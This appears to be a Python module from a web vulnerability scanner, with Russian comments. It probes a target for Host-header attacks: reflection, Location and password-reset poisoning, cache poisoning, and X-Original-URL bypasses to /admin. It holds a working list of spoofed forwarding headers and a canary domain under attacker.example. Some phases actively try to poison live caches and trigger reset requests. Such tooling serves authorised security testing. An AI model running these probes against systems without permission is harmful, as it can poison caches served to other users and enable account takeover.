"""host_header_advanced v2 — Host header attacks with baseline + verify.

Классы атак:
  1. Reset password poisoning — XFH в ссылке на сброс
  2. Cache poisoning — XFH в кэшируемом ответе
  3. Routing bypass — XFH: localhost, X-Original-URL: /admin
  4. Body reflection — XFH в HTML (может быть reflected XSS)
  5. Redirect poisoning — XFH в Location header

Отличия от v1:
  - Уникальный canary на запуск (не hardcoded evil.attacker.example)
  - Baseline фильтр — что уже есть в HTML до инъекции
  - Verify ×2
  - is_signal(module="host_header")
  - 20+ host-header форм вместо 9
  - Password reset paths расширены до 12
  - Cache detection: X-Cache, CF-Cache-Status, Age, X-Varnish, X-Cache-Hits
"""
import secrets
from urllib.parse import urlparse
from core.http import HttpClient
from core.verify import verify, confidence, is_signal


# 20+ форм host-header инъекций
HOST_HEADERS = {
    "Host":                      "{canary}",
    "X-Forwarded-Host":          "{canary}",
    "X-Forwarded-Server":        "{canary}",
    "X-Host":                    "{canary}",
    "X-Original-Host":           "{canary}",
    "X-Original-URL":            "/admin",
    "X-Rewrite-URL":             "/admin",
    "X-Forwarded-Prefix":        "/admin",
    "X-HTTP-Host-Override":      "{canary}",
    "X-Forwarded-For":           "127.0.0.1",
    "Forwarded":                 "host={canary}",
    "X-Forwarded":               "host={canary}",
    "X-Backend-Host":            "{canary}",
    "X-Forwarded-Proto":         "https",
    "X-Forwarded-Port":          "443",
    "X-ProxyUser-Ip":            "127.0.0.1",
    "CF-Connecting-IP":          "127.0.0.1",
    "True-Client-IP":            "127.0.0.1",
    "X-Real-IP":                 "127.0.0.1",
    "Front-End-Https":           "on",
    "X-Forwarded-SSL":           "on",
    "X-Url-Scheme":              "https",
}

# password reset endpoints
RESET_PATHS = [
    "/forgot", "/forgot-password", "/password/forgot",
    "/reset", "/reset-password", "/password/reset",
    "/account/recover", "/account/forgot",
    "/users/password/new", "/auth/forgot",
    "/api/password-reset", "/api/v1/password/forgot",
    "/users/password", "/password-recovery",
]

# cache headers
CACHE_HEADERS = ["X-Cache", "CF-Cache-Status", "Age", "X-Varnish",
                 "X-Cache-Hits", "X-Served-By", "Fastly-Debug-Digest"]


def _canary():
    return f"canary-{secrets.token_hex(6)}.attacker.example"


class HostHeaderAdvanced:
    def run(self, session, logger):
        target = session.target
        u = urlparse(target)
        domain = u.hostname or ""
        http = HttpClient(session, logger)

        canary = _canary()
        canary_host = canary.split(".")[0]  # "canary-xxxxx"

        print(f"[host_header v2] target: {target}")
        print(f"[host_header v2] canary: {canary}")

        # === baseline: что в HTML без инъекции ===
        try:
            base_r = http.get(target, allow_redirects=False)
            baseline_text = (base_r.text or "") if base_r else ""
            baseline_code = base_r.status_code if base_r else 0
        except Exception:
            baseline_text = ""
            baseline_code = 0

        findings = []

        # ============================================================
        # 1. Body reflection — canary в тексте
        # ============================================================
        print()
        print("[host_header v2] Phase 1: body reflection")
        for h, tmpl in HOST_HEADERS.items():
            hval = tmpl.format(canary=canary) if "{canary}" in tmpl else tmpl
            if "{canary}" not in tmpl:
                continue  # skip pure routing headers (без canary)
            try:
                r = http.get(target, headers={h: hval}, allow_redirects=False)
            except Exception:
                continue
            if not r:
                continue

            body = r.text or ""
            # строгая проверка: canary есть в ответе И его не было в baseline
            if canary in body and canary not in baseline_text:
                # verify ×2
                def rep():
                    try:
                        return http.get(target, headers={h: hval}, allow_redirects=False)
                    except Exception:
                        return None

                def predicate(s):
                    return canary in (s.get("body", "") or "")

                ratio, hits = verify(rep, predicate, n=2, delay=0.2)
                conf = confidence(0.85, ratio)
                if not is_signal(conf, floor=0.55, module="host_header"):
                    continue

                findings.append({
                    "type": "body_reflection",
                    "severity": "high",
                    "header": h,
                    "verify_hits": hits,
                    "confidence": conf,
                })
                print(f"  ✓ [{h}] canary reflected in body")
                logger.finding("host_header_reflect", "high",
                               f"{h} conf={int(conf*100)}")

        # ============================================================
        # 2. Location header poisoning
        # ============================================================
        print()
        print("[host_header v2] Phase 2: Location poisoning")
        for h, tmpl in HOST_HEADERS.items():
            if "{canary}" not in tmpl:
                continue
            hval = tmpl.format(canary=canary)
            try:
                r = http.get(target, headers={h: hval}, allow_redirects=False)
            except Exception:
                continue
            if not r:
                continue
            loc = r.headers.get("Location", "")
            if canary in loc:
                findings.append({
                    "type": "location_poisoning",
                    "severity": "critical",
                    "header": h,
                    "location": loc[:200],
                })
                print(f"  ✓ [{h}] canary in Location: {loc[:60]}")
                logger.finding("host_header_location", "critical",
                               f"{h} -> {loc[:80]}")

        # ============================================================
        # 3. Password reset poisoning
        # ============================================================
        print()
        print(f"[host_header v2] Phase 3: password reset poisoning ({len(RESET_PATHS)} paths)")
        for path in RESET_PATHS:
            url = target.rstrip("/") + path
            # пробуем POST с XFH
            for h in ["X-Forwarded-Host", "Host", "X-Original-Host", "X-Forwarded-Server"]:
                hval = canary
                try:
                    r = http.post(url,
                                  data={"email": "omni-test@example.com",
                                        "username": "omni-test"},
                                  headers={h: hval})
                except Exception:
                    continue
                if not r:
                    continue
                body = r.text or ""
                if canary in body and canary not in baseline_text:
                    findings.append({
                        "type": "reset_poisoning",
                        "severity": "critical",
                        "path": path,
                        "header": h,
                        "confidence": 0.9,
                    })
                    print(f"  ✓ reset poison: {path} via {h}")
                    logger.finding("host_header_reset_poison", "critical",
                                   f"{path} via {h}")
                    break  # достаточно на path

        # ============================================================
        # 4. Cache poisoning detection
        # ============================================================
        print()
        print("[host_header v2] Phase 4: cache poisoning detection")

        cache_indicators = {}
        try:
            r1 = http.get(target, allow_redirects=False)
            if r1:
                for ch in CACHE_HEADERS:
                    v = r1.headers.get(ch)
                    if v:
                        cache_indicators[ch] = v
        except Exception:
            pass

        if cache_indicators:
            print(f"  cache headers detected: {list(cache_indicators.keys())}")
            for h in ["X-Forwarded-Host", "X-Forwarded-Scheme", "X-Forwarded-Proto"]:
                hval = canary if "Host" in h else "nothttps"
                try:
                    http.get(target, headers={h: hval}, allow_redirects=False)
                    http.get(target, headers={h: hval}, allow_redirects=False)
                    r3 = http.get(target, allow_redirects=False)
                except Exception:
                    continue
                if r3 and (canary in (r3.text or "") or
                           "nothttps" in (r3.headers.get("Location", ""))):
                    findings.append({
                        "type": "cache_poisoning",
                        "severity": "critical",
                        "header": h,
                        "cached_value": hval,
                    })
                    print(f"  cache poison via {h}")
                    logger.finding("host_header_cache_poison", "critical", f"via {h}")

        # ============================================================
        # 5. Routing bypass
        # ============================================================
        print()
        print("[host_header v2] Phase 5: routing bypass")

        direct_code = 0
        try:
            direct = http.get(target.rstrip("/") + "/admin", allow_redirects=False)
            direct_code = direct.status_code if direct else 0
        except Exception:
            pass

        for bypass_headers in [
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Forwarded-Prefix": "/admin"},
            {"X-Original-URL": "/admin", "X-Forwarded-For": "127.0.0.1"},
            {"X-Rewrite-URL": "/admin", "X-Forwarded-For": "127.0.0.1"},
        ]:
            try:
                r = http.get(target, headers=bypass_headers, allow_redirects=False)
            except Exception:
                continue
            if not r:
                continue
            if direct_code in (401, 403, 404) and r.status_code == 200:
                findings.append({
                    "type": "routing_bypass",
                    "severity": "critical",
                    "header": list(bypass_headers.keys()),
                    "direct": direct_code,
                    "bypass": r.status_code,
                })
                print(f"  routing bypass: {list(bypass_headers.keys())} -> {r.status_code}")
                logger.finding("host_header_bypass", "critical",
                               f"{list(bypass_headers.keys())} {direct_code}->{r.status_code}")

        # ============================================================
        # 6. Итог
        # ============================================================
        print()
        print(f"[host_header v2] findings: {len(findings)}")
        return {
            "findings": findings,
            "canary": canary,
            "headers_tested": len(HOST_HEADERS),
        }
